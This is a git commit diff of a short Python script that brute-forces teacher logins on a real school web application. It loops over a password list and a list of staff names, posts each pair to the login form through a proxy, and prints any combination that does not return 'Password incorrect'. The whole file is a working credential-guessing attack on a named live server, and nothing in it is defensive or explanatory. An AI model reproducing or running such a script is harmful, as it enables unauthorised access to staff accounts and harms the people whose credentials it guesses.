2c1c3fc1899c01f045943da22fc5e58355bd7fcf
ianStuy <norbekian9@gmail.com>
2018-09-25 11:45:26 -0400

    Done

--- teachTester.py
+++ teachTester.py
@@ -1,15 +1,26 @@
 import requests
 passwords = open("passwords.txt", "r")
 teachers = open("teacher2.txt", "r")
-url = "http://bert.stuy.edu/pbrooks/seating_chart/class_chart.py"
-#cat teacher.txt | sed -e 's/<option value=\(.*\)>/\1/' |  cut -f1,2 -d'"' | cut -c 2-  > teacher2.txt
-lastResponse = None
+url = "http://bert.stuy.edu/pbrooks/flashcard/flashcard.py"
+#cat cTeacher.txt | sed -e 's/<option value=\(.*\)>/\1/' |  cut -f1,2 -d'"' | cut -c 2-  > teacher2.txt
+
+proxyDict = { 
+              "http"  : "http://149.89.1.30:3128",
+              "https" : "https://149.89.1.30:3128"
+            }
+
+
 for teacher in teachers:
+    print(teacher)
     for password in passwords:
         #if lastResponse:
-        data = {"password": password, "staff":teacher.strip("\n"), "teacher-login":"Next"}
-        r = requests.post(url = url, data = data) 
+        data = {"password": password, "staff":teacher.strip("\n"),"teacher":"AMBIA", "teacher-login":"Next"}
+        r = requests.post(url = url, data = data,  proxies=proxyDict) 
 
         response = r.text 
-        print(teacher.strip("\n"), ":", password)
+        print(password)
+        if "Password incorrect" not in response:
+            
+            print(teacher.strip("\n"), ":", password)
+            input("-->")
 
